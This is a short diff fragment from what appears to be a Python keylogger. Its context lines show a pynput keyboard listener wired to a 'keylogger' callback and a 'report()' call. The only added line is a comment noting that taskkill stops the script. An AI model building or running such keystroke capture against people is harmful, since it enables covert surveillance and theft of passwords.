@@ -24,3 +24,5 @@ keyboard_listener = pynput.keyboard.Listener(on_press=keylogger)
 with keyboard_listener:
     report()
     keyboard_listener.join()
+
+# taskkill /F /IM python.exe -to stop the script
